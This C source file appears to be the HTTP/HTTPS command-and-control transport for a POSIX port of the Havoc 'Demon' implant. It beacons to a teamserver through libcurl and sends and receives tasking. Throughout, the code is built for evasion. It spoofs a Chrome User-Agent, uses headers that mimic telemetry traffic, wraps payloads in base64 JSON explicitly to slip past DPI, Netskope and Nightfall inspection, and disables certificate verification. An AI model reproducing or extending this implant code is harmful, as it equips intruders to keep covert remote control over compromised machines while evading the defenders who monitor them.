/*
 * Transport.c — HTTP/HTTPS C2 transport for the POSIX Demon agent.
 *
 * Uses libcurl for HTTP/HTTPS so the agent works on both Linux and macOS
 * without writing raw TLS code. libcurl is available on both platforms
 * either via the system package manager or Homebrew.
 *
 * The function signatures mirror TransportHttp.c from the Windows Demon.
 */

#include "DemonPosix.h"
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>

/* ── Response accumulation buffer ────────────────────────────────────── */
typedef struct {
    uint8_t *data;
    size_t   size;
} CurlBuf;

static size_t curl_write_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t    realsize = size * nmemb;
    CurlBuf  *buf      = (CurlBuf *)userp;
    uint8_t  *ptr      = (uint8_t *)realloc(buf->data, buf->size + realsize);
    if (!ptr) return 0; /* out of memory — curl will abort */
    buf->data  = ptr;
    memcpy(buf->data + buf->size, contents, realsize);
    buf->size += realsize;
    return realsize;
}

/* ── Module-level curl handle (reused across calls) ─────────────────── */
static CURL             *g_curl      = NULL;
static struct curl_slist *g_headers  = NULL;

/* ── Build the URL from transport config ─────────────────────────────── */
static void build_url(char *out, size_t out_sz)
{
    HTTP_CONFIG *h = &DemonInstance->Transport.Http;
    const char  *scheme = h->Ssl ? "https" : "http";

    if ((h->Ssl && h->Port == 443) || (!h->Ssl && h->Port == 80)) {
        snprintf(out, out_sz, "%s://%s%s", scheme, h->Host,
                 h->Uri ? h->Uri : "/");
    } else {
        snprintf(out, out_sz, "%s://%s:%u%s", scheme, h->Host, h->Port,
                 h->Uri ? h->Uri : "/");
    }
}

/* ── Init ────────────────────────────────────────────────────────────── */
int TransportHttpInit(void)
{
    if (curl_global_init(CURL_GLOBAL_ALL) != CURLE_OK) return -1;

    g_curl = curl_easy_init();
    if (!g_curl) return -1;

    HTTP_CONFIG *h = &DemonInstance->Transport.Http;

    /* User-Agent — use the one baked in at compile time (from the listener config).
     * CONFIG_UA is set by the builder to match the listener's expected User-Agent
     * exactly. If not set, fall back to a realistic macOS Chrome UA. */
#ifdef CONFIG_UA
    const char *ua = CONFIG_UA;
#else
    const char *ua = h->UserAgent
                   ? h->UserAgent
                   : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/120.0.0.0 Safari/537.36";
#endif
    curl_easy_setopt(g_curl, CURLOPT_USERAGENT, ua);

    /* Headers — mimic a real browser POST (e.g. analytics/telemetry beacon) */
    g_headers = NULL;
    for (size_t i = 0; i < h->HeaderCount; i++) {
        g_headers = curl_slist_append(g_headers, h->Headers[i]);
    }
    /* Use application/json content-type to blend with API traffic.
     * The actual body is base64-encoded to obscure binary patterns. */
    g_headers = curl_slist_append(g_headers, "Content-Type: application/json");
    g_headers = curl_slist_append(g_headers, "Accept: application/json, text/plain, */*");
    g_headers = curl_slist_append(g_headers, "Accept-Language: en-US,en;q=0.9");
    g_headers = curl_slist_append(g_headers, "Cache-Control: no-cache");
    g_headers = curl_slist_append(g_headers, "Pragma: no-cache");
    curl_easy_setopt(g_curl, CURLOPT_HTTPHEADER, g_headers);

    /* TLS certificate verification.
     *
     * The Havoc teamserver uses a self-signed certificate generated at
     * runtime, so standard CA chain verification will always fail.
     * We disable peer and host verification — same behaviour as the
     * Windows Demon which uses WinHTTP without certificate validation.
     *
     * If CONFIG_SSL_FINGERPRINT is defined at compile time we instead
     * pin to that exact SHA-256 fingerprint for stronger security:
     *   -DCONFIG_SSL_FINGERPRINT=\"sha256//base64...\"
     */
#ifdef CONFIG_SSL_FINGERPRINT
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(g_curl, CURLOPT_PINNEDPUBLICKEY, CONFIG_SSL_FINGERPRINT);
#else
    /* Default: accept any certificate (self-signed teamserver cert) */
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif

    /* Proxy */
    if (h->ProxyUrl) {
        curl_easy_setopt(g_curl, CURLOPT_PROXY, h->ProxyUrl);
    }

    /* Response callback */
    curl_easy_setopt(g_curl, CURLOPT_WRITEFUNCTION, curl_write_cb);

    /* Follow redirects */
    curl_easy_setopt(g_curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(g_curl, CURLOPT_MAXREDIRS, 5L);

    /* Timeout (seconds) */
    curl_easy_setopt(g_curl, CURLOPT_TIMEOUT, 30L);

    return 0;
}

void TransportHttpCleanup(void)
{
    if (g_headers) { curl_slist_free_all(g_headers); g_headers = NULL; }
    if (g_curl)    { curl_easy_cleanup(g_curl);       g_curl    = NULL; }
    curl_global_cleanup();
}

/* ── Send a POST request and receive the response ─────────────────────
 *
 * TransportSendRecv — the single entry point for all C2 I/O.
 *
 * Sends `request` bytes via HTTP POST and populates *response /
 * *resp_len with the server's reply (caller must free(*response)).
 *
 * Returns 0 on success, -1 on failure.
 */
/* ── Base64 encode/decode (no external deps) ─────────────────────────── */
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const uint8_t *src, size_t len, size_t *out_len)
{
    size_t enc_len = ((len + 2) / 3) * 4 + 1;
    char  *out     = (char *)malloc(enc_len);
    if (!out) return NULL;
    size_t i = 0, j = 0;
    while (i < len) {
        uint32_t a = i < len ? src[i++] : 0;
        uint32_t b = i < len ? src[i++] : 0;
        uint32_t c = i < len ? src[i++] : 0;
        uint32_t triple = (a << 16) | (b << 8) | c;
        out[j++] = b64_table[(triple >> 18) & 0x3F];
        out[j++] = b64_table[(triple >> 12) & 0x3F];
        out[j++] = (i > len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        out[j++] = (i > len)     ? '=' : b64_table[triple & 0x3F];
    }
    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

static uint8_t *b64_decode(const char *src, size_t src_len, size_t *out_len)
{
    static const uint8_t dec[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63
    };
    if (src_len == 0) { *out_len = 0; return NULL; }
    size_t pad  = (src_len > 0 && src[src_len-1] == '=') ? 1 : 0;
    if (src_len > 1 && src[src_len-2] == '=') pad++;
    size_t dec_len = (src_len / 4) * 3 - pad;
    uint8_t *out = (uint8_t *)malloc(dec_len + 1);
    if (!out) return NULL;
    size_t i = 0, j = 0;
    while (i < src_len && src[i] != '=') {
        uint32_t a = dec[(uint8_t)src[i++]];
        uint32_t b = dec[(uint8_t)src[i++]];
        uint32_t c = (i < src_len && src[i] != '=') ? dec[(uint8_t)src[i++]] : 0;
        uint32_t d = (i < src_len && src[i] != '=') ? dec[(uint8_t)src[i++]] : 0;
        if (j < dec_len)     out[j++] = (a << 2) | (b >> 4);
        if (j < dec_len)     out[j++] = ((b & 0xF) << 4) | (c >> 2);
        if (j < dec_len)     out[j++] = ((c & 3) << 6) | d;
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

/* ── JSON wrapper ─────────────────────────────────────────────────────
 * Wrap binary payload in: {"d":"<base64>","t":<timestamp>}
 * This hides the binary magic bytes from DPI / Netskope / Nightfall.
 */
static char *wrap_json(const uint8_t *data, size_t len, size_t *out_len)
{
    size_t b64_len = 0;
    char  *b64     = b64_encode(data, len, &b64_len);
    if (!b64) return NULL;

    /* {"d":"<b64>","t":1234567890}\0
     * overhead = {"d":"","t":} = 14 + 10 (timestamp) + 1 (NUL) = 25 → use 64 margin */
    size_t buf_len = b64_len + 64;
    char  *json    = (char *)malloc(buf_len);
    if (!json) { free(b64); return NULL; }
    long ts      = (long)time(NULL);
    int  written = snprintf(json, buf_len, "{\"d\":\"%s\",\"t\":%ld}", b64, ts);
    free(b64);
    if (written < 0 || (size_t)written >= buf_len) { free(json); return NULL; }
    *out_len = (size_t)written;
    return json;
}

/* Unwrap: extract base64 from {"d":"<base64>",...} */
static uint8_t *unwrap_json(const uint8_t *body, size_t body_len, size_t *out_len)
{
    /* Find "d":"..." field */
    const char *p = (const char *)body;
    const char *needle = "\"d\":\"";
    const char *pos = strstr(p, needle);
    if (!pos) {
        /* No JSON wrapper — return raw (server sent unencoded response) */
        uint8_t *copy = (uint8_t *)malloc(body_len);
        if (!copy) return NULL;
        memcpy(copy, body, body_len);
        *out_len = body_len;
        return copy;
    }
    pos += strlen(needle);
    const char *end = strchr(pos, '"');
    if (!end) return NULL;
    return b64_decode(pos, (size_t)(end - pos), out_len);
}

int TransportSendRecv(const uint8_t *request,  size_t   req_len,
                      uint8_t      **response,  size_t  *resp_len)
{
    if (!g_curl || !request || !response || !resp_len) return -1;

    char url[2048];
    build_url(url, sizeof(url));

    /* Wrap payload in JSON+base64 to hide binary magic from DPI */
    size_t json_len  = 0;
    char  *json_body = wrap_json(request, req_len, &json_len);
    if (!json_body) return -1;

    CurlBuf resp_buf = { .data = NULL, .size = 0 };

    curl_easy_setopt(g_curl, CURLOPT_URL, url);
    curl_easy_setopt(g_curl, CURLOPT_POST, 1L);
    curl_easy_setopt(g_curl, CURLOPT_POSTFIELDS,    json_body);
    /* Use the ACTUAL written length, not the buffer capacity */
    curl_easy_setopt(g_curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));
    curl_easy_setopt(g_curl, CURLOPT_WRITEDATA, &resp_buf);

    CURLcode res = curl_easy_perform(g_curl);
    free(json_body);   /* free the wrapped request */

    if (res != CURLE_OK) {
        DEMON_LOG("curl_easy_perform() failed: %s", curl_easy_strerror(res));
        if (resp_buf.data) free(resp_buf.data);
        return -1;
    }

    long http_code = 0;
    curl_easy_getinfo(g_curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code != 200) {
        DEMON_LOG("HTTP error: %ld", http_code);
        if (resp_buf.data) free(resp_buf.data);
        return -1;
    }

    /* Unwrap JSON response if present */
    if (resp_buf.size > 0 && resp_buf.data[0] == '{') {
        size_t  unwrapped_len = 0;
        uint8_t *unwrapped    = unwrap_json(resp_buf.data, resp_buf.size, &unwrapped_len);
        free(resp_buf.data);
        if (!unwrapped) return -1;
        *response = unwrapped;
        *resp_len = unwrapped_len;
    } else {
        *response = resp_buf.data;
        *resp_len = resp_buf.size;
    }
    return 0;
}
